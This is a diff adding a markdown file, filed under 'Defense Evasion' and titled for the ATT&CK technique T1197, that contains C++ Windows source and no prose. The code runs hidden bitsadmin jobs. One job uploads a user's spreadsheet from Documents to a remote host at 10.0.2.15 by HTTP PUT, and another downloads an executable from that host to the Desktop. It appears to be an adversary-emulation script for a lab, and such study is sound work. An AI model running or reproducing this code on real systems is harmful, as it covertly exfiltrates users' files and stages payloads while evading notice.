@@ -1,0 +1,104 @@
+---
+title: "T1197.BITS Jobs.BITS Jobs"
+folder: "07. Defense Evasion"
+---
+
+
+
+#include <windows.h>
+#include <fstream>
+#include <iostream>
+
+void BITSwysylanieBackground() {
+
+    const char* command1 = "bitsadmin /create /UPLOAD Testika";
+    const char* command2 = "bitsadmin /addfile Testika http://10.0.2.15:80/upload/BITS-DE.txt C:\\Users\\User\\Documents\\WażneDaneTabelaryczne.xlsx";
+    const char* command3 = "bitsadmin /SETHTTPMETHOD Testika PUT";
+    const char* command4 = "bitsadmin /resume Testika";
+    const char* command6 = "bitsadmin /complete Testika";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+    
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command1), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command2), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command3), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command4), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    Sleep(5000);
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command6), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+
+
+}
+
+
+void BITSpobieranieBackground() {
+
+    const char* command1 = "bitsadmin /create Testikaa";
+    const char* command2 = "bitsadmin /addfile Testikaa http://10.0.2.15:80/KimJestem.exe C:\\Users\\User\\Desktop\\KimJestem.exe";
+    const char* command4 = "bitsadmin /resume Testikaa";
+    const char* command6 = "bitsadmin /complete Testikaa";
+    STARTUPINFOA si = {};
+    si.cb = sizeof(STARTUPINFOA);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi;
+
+
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command1), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command2), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command4), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+    Sleep(5000);
+    if (CreateProcessA(NULL, const_cast<LPSTR>(command6), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
+        WaitForSingleObject(pi.hProcess, INFINITE);
+        CloseHandle(pi.hThread);
+        CloseHandle(pi.hProcess);
+    }
+
+
+}
+
+
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+
+    BITSwysylanieBackground();
+    BITSpobieranieBackground();
+
+    return 0;
+}
